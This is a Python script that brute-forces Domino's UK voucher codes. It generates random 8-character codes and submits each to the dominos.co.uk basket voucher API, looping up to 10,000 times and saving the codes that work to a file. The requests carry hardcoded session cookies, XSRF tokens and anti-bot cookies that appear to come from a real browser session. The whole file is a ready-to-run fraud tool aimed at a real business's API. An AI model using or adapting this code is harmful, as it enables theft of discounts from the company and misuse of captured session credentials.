import signal
import string
import threading
import requests
import random

lock = threading.Lock()
valid_vouchers, invalid_vouchers = [], []
threads = []


def write_vouchers_to_file(vouchers, name):
    with lock:
        with open(name + ".txt", "w+") as f:
            return f.writelines([voucher + "\n" for voucher in vouchers])


def read_vouchers_from_file(name):
    try:
        return open(name + ".txt", "r").readlines()
    except FileNotFoundError:
        return []


vouchers = read_vouchers_from_file("invalid")


def add_voucher(vouchers, voucher):
    with lock:
        vouchers.append(voucher)


def remove_voucher(vouchers, voucher):
    with lock:
        vouchers.remove(voucher)


def cleanup(sig_num, frame):
    global valid_vouchers, invalid_vouchers
    print(f"Invalids: {len(invalid_vouchers)} Valids: {len(valid_vouchers)}")

    write_vouchers_to_file(valid_vouchers, name="valid")
    write_vouchers_to_file(invalid_vouchers, name="invalid")
    exit(0)


def register_signals():
    termination_signals = [
        signal.SIGINT,
        signal.SIGTERM,
        signal.SIGTERM,
    ]
    # termination_signals = [
    #     s for s in dir(signal) if s.startswith("SIG") and type(s) is int
    # ]

    [signal.signal(sig, lambda s, f: cleanup(s, f)) for sig in termination_signals]


register_signals()


def generate_voucher():
    return "".join(random.choices(string.ascii_letters + string.digits, k=8))


def generate_unique_voucher(vouchers):
    voucher = generate_voucher()
    while voucher in vouchers:
        voucher = generate_voucher()
    return voucher


def isDominosVoucherValid(voucher):
    cookies = {
        "akacd_prod_uk_pr": "1697171486~rv=2~id=50c9139898b03a09759a25b9d3e1ab0b",
        "aka_supported_browser": "true",
        "DPGStore": '{"storeId":28007,"seoUrl":"luton-central"}',
        "RememberedUser": "p4XuloCAgvRDycvEJbM8buUDea0y9j4z8lEo8aSpJRoHhndF4FC1Nf2LsSlCYQNfbMwhcoTc9MLxvdkRDQW7RtrUE1c334R+Q5e2u4rH+SgBREK4ZANPdrkHqc5p4dwI",
        "DPGLocationToken": "U2FsdGVkX198NUR7cpUtpaLeVoea1DFCAfSBbVBBjnBMxgpl50iSxvVYGRrssYQkXwE1rBaY2MLTRdMlan42ptvgk7lGsIo4YI1yEhhwnC3uwaDi1s8zkUjbALUYDSXERGmD2xJrCKOTG1LOOGqtSw%3D%3D",
        "DPGFulfilmentMethod": "Collection",
        "BasicInformation": "PobKPio3k7BrmRxxdw+00UAHRw2FT3nDPPXgEGVJRVY=",
        "DPG": "vhevtwnabf1ffmdh1rev2vvx",
        "DPGDC": "DC3",
        "Y-XSRF-TOKEN": "AsrH6i4Jh2GkvoxCeLunSla91zBpF/3CPuVhk3LhoE4=",
        "akaalb_alb01": "~op=alb_phx_uk_k8s_livestr:co-phx-uk-uks-livestr01|ProdUK:produk_origin2|~rv=4~m=co-phx-uk-uks-livestr01:0|produk_origin2:0|~os=44d4d9335661eb2014d9e1271072b451~id=e88f173c17978fb98d6c9bfc02727d88",
        "AKA_A2": "A",
        "bm_sz": "E95D15B9B45CD5E2133C607BC31F7D56~YAAQnrD3SPpVb8qKAQAADXKA1hVJvgJskbQioBPEaeMYf1AwidGCDOHnCzGQ5Sx22ak3ofCG8XL42aulN5liDhttd2VU8ywlcmVNhqyES0p+kOzLinW1S1D/rLLtJk2T9nBOauXs6Pwhly58ocFPwgBi7yAs7v7eu1TssMI2wK71Om2GQN9hn0/yCRyqIbTIF6G+r422w9oFiPJqDTaXmmzY2GgxxpMVcNMip9xEutECqXF6tbNBm3aKoiXeOyKlzKqajJAg67ApS9/Cxo+7QJock9iYbn7n5CvFlB+Ayudr4f7pfGI=~3227972~3422276",
        "ak_bmsc": "841551B7C3C9F1FE4591C3300033CA05~000000000000000000000000000000~YAAQnrD3SCxWb8qKAQAAOXSA1hW6CRuhnWIqmTtUQMewESwkAEixI1inW+UryxilltZBBHI1qhPe7BobkVK4nKG8wqg2oWXLYgegKeJWsr9dGh9WpSjK9cdJ2Q3b/c8aIt/HEYDpKX+B97Nj2Q8Nyh1E1DDOaL/0tqAdev3vp+i62O2u8JqYH0fHk7C84iWRhav/SNQv3vRDz6fIVBgPCCxNW1guqz2xlVHaevttfwjv98tJC03QDamQmCC1VOUW/tyBBvbPgZgRPvmh2JorMvt7bCXh1txBtcmY7SGcNTjIWlD55FNN3jMbIzyKMXzNNsc2QXtTWY0BOIDwhd1nWjeLOdXt94zRE/xYgBP3kN4PE8RpaTxSBut3Fo59PIwAiwX2Ua223PHC4cxAzA==",
        "_abck": "EF3FC607EAA8558CAE7572666956A4BE~0~YAAQnrD3SHdWb8qKAQAAy3mA1gpxnvQsdGSPzDeTFjN6m751cuNZLxlIkPoUhWqWO36hJ+iL+OhIW9HZc/QARe1dS2F85pZ9cs0WuxQg23LlFhwd3GfXuNTY98zChlZjOOn2dR9RNmagWRr6aZ6Khm9yxTMJE+fmT2Do9YIluBzPrhxRx0oSSbV9tPy7GkxYjRUt73Ol+4unCWYXy9djFYYUfo0He9RVHZl6BgoxLd0pMG6rHLwOckGkqpBHzLyQV2qt/2+kAbVBvMzeTjzhLtuzakSBipaOohBnMwy4GXMhr0Ui24lewpvdsmfoPD3wymNGWyuqQRKLIKJ2w+qx3y2C7TadFqBg8B8A6spKyJPDIS8r7pjtKsY0qfUeipwAsvv84lQBt5x6jHFv4FY/myzaIxGWyEmd9S5s~-1~-1~-1",
        "bm_sv": "91A3EABBDCA68D9039F3005F2340CF00~YAAQnrD3SDxab8qKAQAAaKmA1hXOIlNO8n7oMCwnNhYwlk2Pf3U5FGkXOz4uaAQ/103IYBJYlFO1HymqGcCSfraIxVtH6GCg0mwOecUcTaMU8+q6dcGlA+ThaaL4pTM0Bb6FlNnXe9gnPB4GztUrl4FUBZBJeAjypfBD36L4MGF5iq3+P5C5mBJmhPFCdCjgRQPrbXJYenwBdJH/YXSEBUzD2e44TaxyRaB1HMU//25pH7WXkX14j0I5NNWTGkRXlIVp~1",
        "DPGSessionExp": "1695817070870",
    }

    headers = {
        "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        "x-xsrf-token": "AsrH6i4Jh2GkvoxCeLunSla91zBpF/3CPuVhk3LhoE4=",
        "tracestate": "849552@nr=0-1-849552-718320828-2eb6c91745bf16da----1695815872595",
        "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6Ijg0OTU1MiIsImFwIjoiNzE4MzIwODI4IiwiaWQiOiIyZWI2YzkxNzQ1YmYxNmRhIiwidHIiOiI2NmNmODdkZGZhOTkwZGIzN2ZlZjAzZThhMzRmNzcwMCIsInRpIjoxNjk1ODE1ODcyNTk1fX0=",
        "y-xsrf-token": "AsrH6i4Jh2GkvoxCeLunSla91zBpF/3CPuVhk3LhoE4=",
        "x-forwarded-proto": "https",
        "sec-ch-ua-platform": '"Windows"',
        "x-newrelic-id": "XAIOVFNRGwUIV1JXBQUHVQ==",
        "x-forwarded-host": "www.dominos.co.uk",
        "traceparent": "00-66cf87ddfa990db37fef03e8a34f7700-2eb6c91745bf16da-01",
        "x-dpg-market": "UK",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "dpg-journey-id": "ksANvckfSmW/jOIak5ZkwEsBYbvLxEdueJQgr/NVcJY=",
        "origin": "https://www.dominos.co.uk",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        # 'cookie': 'akacd_prod_uk_pr=1697171486~rv=2~id=50c9139898b03a09759a25b9d3e1ab0b; aka_supported_browser=true; DPGStore={"storeId":28007,"seoUrl":"luton-central"}; RememberedUser=p4XuloCAgvRDycvEJbM8buUDea0y9j4z8lEo8aSpJRoHhndF4FC1Nf2LsSlCYQNfbMwhcoTc9MLxvdkRDQW7RtrUE1c334R+Q5e2u4rH+SgBREK4ZANPdrkHqc5p4dwI; DPGLocationToken=U2FsdGVkX198NUR7cpUtpaLeVoea1DFCAfSBbVBBjnBMxgpl50iSxvVYGRrssYQkXwE1rBaY2MLTRdMlan42ptvgk7lGsIo4YI1yEhhwnC3uwaDi1s8zkUjbALUYDSXERGmD2xJrCKOTG1LOOGqtSw%3D%3D; DPGFulfilmentMethod=Collection; BasicInformation=PobKPio3k7BrmRxxdw+00UAHRw2FT3nDPPXgEGVJRVY=; DPG=vhevtwnabf1ffmdh1rev2vvx; DPGDC=DC3; Y-XSRF-TOKEN=AsrH6i4Jh2GkvoxCeLunSla91zBpF/3CPuVhk3LhoE4=; akaalb_alb01=~op=alb_phx_uk_k8s_livestr:co-phx-uk-uks-livestr01|ProdUK:produk_origin2|~rv=4~m=co-phx-uk-uks-livestr01:0|produk_origin2:0|~os=44d4d9335661eb2014d9e1271072b451~id=e88f173c17978fb98d6c9bfc02727d88; AKA_A2=A; bm_sz=E95D15B9B45CD5E2133C607BC31F7D56~YAAQnrD3SPpVb8qKAQAADXKA1hVJvgJskbQioBPEaeMYf1AwidGCDOHnCzGQ5Sx22ak3ofCG8XL42aulN5liDhttd2VU8ywlcmVNhqyES0p+kOzLinW1S1D/rLLtJk2T9nBOauXs6Pwhly58ocFPwgBi7yAs7v7eu1TssMI2wK71Om2GQN9hn0/yCRyqIbTIF6G+r422w9oFiPJqDTaXmmzY2GgxxpMVcNMip9xEutECqXF6tbNBm3aKoiXeOyKlzKqajJAg67ApS9/Cxo+7QJock9iYbn7n5CvFlB+Ayudr4f7pfGI=~3227972~3422276; ak_bmsc=841551B7C3C9F1FE4591C3300033CA05~000000000000000000000000000000~YAAQnrD3SCxWb8qKAQAAOXSA1hW6CRuhnWIqmTtUQMewESwkAEixI1inW+UryxilltZBBHI1qhPe7BobkVK4nKG8wqg2oWXLYgegKeJWsr9dGh9WpSjK9cdJ2Q3b/c8aIt/HEYDpKX+B97Nj2Q8Nyh1E1DDOaL/0tqAdev3vp+i62O2u8JqYH0fHk7C84iWRhav/SNQv3vRDz6fIVBgPCCxNW1guqz2xlVHaevttfwjv98tJC03QDamQmCC1VOUW/tyBBvbPgZgRPvmh2JorMvt7bCXh1txBtcmY7SGcNTjIWlD55FNN3jMbIzyKMXzNNsc2QXtTWY0BOIDwhd1nWjeLOdXt94zRE/xYgBP3kN4PE8RpaTxSBut3Fo59PIwAiwX2Ua223PHC4cxAzA==; _abck=EF3FC607EAA8558CAE7572666956A4BE~0~YAAQnrD3SHdWb8qKAQAAy3mA1gpxnvQsdGSPzDeTFjN6m751cuNZLxlIkPoUhWqWO36hJ+iL+OhIW9HZc/QARe1dS2F85pZ9cs0WuxQg23LlFhwd3GfXuNTY98zChlZjOOn2dR9RNmagWRr6aZ6Khm9yxTMJE+fmT2Do9YIluBzPrhxRx0oSSbV9tPy7GkxYjRUt73Ol+4unCWYXy9djFYYUfo0He9RVHZl6BgoxLd0pMG6rHLwOckGkqpBHzLyQV2qt/2+kAbVBvMzeTjzhLtuzakSBipaOohBnMwy4GXMhr0Ui24lewpvdsmfoPD3wymNGWyuqQRKLIKJ2w+qx3y2C7TadFqBg8B8A6spKyJPDIS8r7pjtKsY0qfUeipwAsvv84lQBt5x6jHFv4FY/myzaIxGWyEmd9S5s~-1~-1~-1; bm_sv=91A3EABBDCA68D9039F3005F2340CF00~YAAQnrD3SDxab8qKAQAAaKmA1hXOIlNO8n7oMCwnNhYwlk2Pf3U5FGkXOz4uaAQ/103IYBJYlFO1HymqGcCSfraIxVtH6GCg0mwOecUcTaMU8+q6dcGlA+ThaaL4pTM0Bb6FlNnXe9gnPB4GztUrl4FUBZBJeAjypfBD36L4MGF5iq3+P5C5mBJmhPFCdCjgRQPrbXJYenwBdJH/YXSEBUzD2e44TaxyRaB1HMU//25pH7WXkX14j0I5NNWTGkRXlIVp~1; DPGSessionExp=1695817070870',
    }

    session = requests.Session()
    # dominos_url = "https://www.dominos.co.uk/store/28007/luton-central/menu"

    response = session.post(
        "https://www.dominos.co.uk/api/baskets/v1/baskets/voucher/swap",
        cookies=cookies,
        headers=headers,
        json={
            "voucherCode": voucher,
        },
    )

    if response.status_code == 404:
        json_response = response.json()
        if len([error for error in json_response["errors"] if error["code"] == 6301]):
            return False

    elif response.ok:
        print(response.__dict__)
        return True

    print(response.__dict__)
    return None


def main(run=100):
    global valid_vouchers, invalid_vouchers
    thread_id = threading.current_thread().ident
    for i in range(0, run):
        voucher = generate_unique_voucher(vouchers)

        if (response := isDominosVoucherValid(voucher)) == True:
            print(f"[{thread_id}] Attempt {i} - Valid voucher: {voucher}")
            add_voucher(valid_vouchers, voucher)

        elif response == False:
            print(f"[{thread_id}] Attempt {i} - Invalid voucher: {voucher}")
            add_voucher(invalid_vouchers, voucher)

        # TODO: Add a sleep if ratelimit occurs
        else:
            break

    write_vouchers_to_file(valid_vouchers, name="valid")
    write_vouchers_to_file(invalid_vouchers, name="invalid")


if __name__ == "__main__":
    main(10000)
    # threads = [threading.Thread(target=main()) for i in range(3)]

    # for t in threads:
    #     t.start()

    # for t in threads:
    #     t.join()
